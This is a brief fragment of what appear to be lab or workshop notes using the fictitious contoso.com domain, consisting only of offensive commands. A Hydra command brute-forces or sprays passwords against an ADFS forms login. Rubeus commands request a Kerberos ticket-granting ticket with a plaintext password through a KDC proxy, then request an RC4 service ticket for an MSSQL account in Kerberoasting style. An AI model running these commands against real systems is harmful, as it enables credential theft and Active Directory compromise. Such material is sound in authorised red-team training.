...
```bash
hydra -I -t 1 -L users.txt -P passwords.txt -u 'login.contoso.com' https-post-form '/adfs/ls?wa=wsignin1.0&wtrealm=urn%3amicrosoft%3aadfs%3aclaimsxray:UserName=^USER^@contoso.com&Password=^PASS^&AuthMethod=FormsAuthentication:S=302'
```
...
```batchfile
E:
cd E:\GOC213\GhostPack
Rubeus.exe asktgt /user:bfu /password:"Pa$$w0rd" /domain:contoso.com /enctype:AES256 /proxyurl:https://10.213.0.5/kdcproxy /outfile:tgt.kirbi
```

```batchfile
Rubeus.exe asktgs /ticket:tgt.kirbi /service:MSSQLSvc/pc3.contoso.com /enctype:RC4 /proxyurl:https://10.213.0.5/kdcproxy
```
